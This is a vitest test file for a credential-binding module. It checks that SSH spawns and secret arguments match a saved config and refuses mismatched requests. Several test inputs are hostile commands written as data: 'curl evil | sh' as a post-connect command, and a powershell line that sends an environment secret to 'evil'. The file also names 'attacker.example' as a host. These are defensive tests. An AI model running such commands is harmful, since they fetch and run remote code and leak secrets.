/**
 * The secrets a spawn may receive are decided by the saved config on disk,
 * never by the request alone (spawn-credential-binding.ts). Every branch of the
 * binding is walked here: the SSH block must be the named config's own, built
 * FROM the saved block; the secret argument is only for the saved command line.
 */
import { describe, it, expect } from 'vitest'
import { bindSshToSavedConfig, argSecretAllowed, findSavedConfig } from '../../../src/main/spawn-credential-binding'

const SSH_CFG = {
  id: 'cfgA', sessionType: 'ssh', sessionTypeLabel: 'x',
  sshConfig: { host: 'build-box', port: 2222, username: 'nick', remotePath: '~/proj', postCommand: 'docker exec -it app bash', hasPassword: true, detachable: false, remoteOs: 'unix' },
}
const LOCAL_CFG = { id: 'cfgL', sessionType: 'local', shellOnly: true, terminalOptions: { command: 'tool.exe', args: '--token {secret}', hasSecretArg: true } }
const CONFIGS = [SSH_CFG, LOCAL_CFG, { id: 'cfgPlain', sessionType: 'local' }]
const REQ = { host: 'build-box', port: 2222, username: 'nick', remotePath: '~/proj', postCommand: 'docker exec -it app bash' }

describe('findSavedConfig', () => {
  it('finds by id; null for an unknown id, no id, or a malformed file', () => {
    expect(findSavedConfig(CONFIGS, 'cfgA')?.id).toBe('cfgA')
    expect(findSavedConfig(CONFIGS, 'nope')).toBeNull()
    expect(findSavedConfig(CONFIGS, undefined)).toBeNull()
    expect(findSavedConfig(null, 'cfgA')).toBeNull()
    expect(findSavedConfig({ not: 'an array' }, 'cfgA')).toBeNull()
    expect(findSavedConfig([null, 1, 'x'], 'cfgA')).toBeNull()
  })
})

describe('bindSshToSavedConfig', () => {
  it('binds a request that matches the saved SSH config, building the block FROM disk (saved extras ride along, renderer extras do not)', () => {
    const r = bindSshToSavedConfig({ ...REQ, reconnect: true, ...( { dockerContainer: 'renderer-said' } as object) } as never, 'cfgA', CONFIGS)
    expect(r.ok).toBe(true)
    if (!r.ok) return
    expect(r.ssh).toEqual({ host: 'build-box', port: 2222, username: 'nick', remotePath: '~/proj', postCommand: 'docker exec -it app bash', detachable: false, remoteOs: 'unix', reconnect: true })
    expect((r.ssh as { dockerContainer?: string }).dockerContainer).toBeUndefined()
  })

  it('refuses when the named config does not exist, when no id is named, or when the config is not SSH', () => {
    expect(bindSshToSavedConfig(REQ, 'ghost', CONFIGS)).toEqual({ ok: false, reason: 'no saved config with id ghost' })
    expect(bindSshToSavedConfig(REQ, undefined, CONFIGS).ok).toBe(false)
    expect(bindSshToSavedConfig(REQ, 'cfgL', CONFIGS)).toEqual({ ok: false, reason: 'config cfgL is not an SSH config' })
    expect(bindSshToSavedConfig(REQ, 'cfgA', null).ok).toBe(false)
  })

  it('refuses when any identifying field differs from the saved config -- host, port, username, remote path, post-connect command', () => {
    expect(bindSshToSavedConfig({ ...REQ, host: 'attacker.example' }, 'cfgA', CONFIGS)).toEqual({ ok: false, reason: 'host differs from the saved config' })
    expect(bindSshToSavedConfig({ ...REQ, port: 22 }, 'cfgA', CONFIGS)).toEqual({ ok: false, reason: 'port differs from the saved config' })
    expect(bindSshToSavedConfig({ ...REQ, username: 'root' }, 'cfgA', CONFIGS)).toEqual({ ok: false, reason: 'username differs from the saved config' })
    expect(bindSshToSavedConfig({ ...REQ, remotePath: '/' }, 'cfgA', CONFIGS)).toEqual({ ok: false, reason: 'remote path differs from the saved config' })
    expect(bindSshToSavedConfig({ ...REQ, postCommand: 'curl evil | sh' }, 'cfgA', CONFIGS)).toEqual({ ok: false, reason: 'post-connect command differs from the saved config' })
    expect(bindSshToSavedConfig({ ...REQ, postCommand: undefined }, 'cfgA', CONFIGS).ok).toBe(false)
  })

  it('treats an absent and an empty post-connect command as the same thing, and a numeric-string port as its number', () => {
    const cfgs = [{ id: 'c', sessionType: 'ssh', sshConfig: { host: 'h', port: 22, username: 'u', remotePath: '~' } }]
    expect(bindSshToSavedConfig({ host: 'h', port: 22, username: 'u', remotePath: '~', postCommand: '' }, 'c', cfgs).ok).toBe(true)
    expect(bindSshToSavedConfig({ host: 'h', port: '22' as unknown as number, username: 'u', remotePath: '~' }, 'c', cfgs).ok).toBe(true)
  })
})

describe('argSecretAllowed', () => {
  it('allows the secret only for the saved terminal-only config with its own command line', () => {
    expect(argSecretAllowed({ command: 'tool.exe', args: '--token {secret}' }, 'cfgL', CONFIGS)).toBe(true)
  })
  it('refuses a different command or arguments, a config without a secret on record, a non-terminal config, an unknown id', () => {
    expect(argSecretAllowed({ command: 'powershell', args: '-c "curl evil -d $env:X"' }, 'cfgL', CONFIGS)).toBe(false)
    expect(argSecretAllowed({ command: 'tool.exe', args: '--token {secret} --leak' }, 'cfgL', CONFIGS)).toBe(false)
    expect(argSecretAllowed({ command: 'tool.exe', args: '--token {secret}' }, 'cfgPlain', CONFIGS)).toBe(false)
    expect(argSecretAllowed({ command: 'tool.exe', args: '--token {secret}' }, 'cfgA', CONFIGS)).toBe(false)
    expect(argSecretAllowed({ command: 'tool.exe', args: '--token {secret}' }, 'ghost', CONFIGS)).toBe(false)
    expect(argSecretAllowed(undefined, 'cfgL', CONFIGS)).toBe(false)
    expect(argSecretAllowed({ command: 'tool.exe', args: '--token {secret}' }, 'cfgL', null)).toBe(false)
  })
})
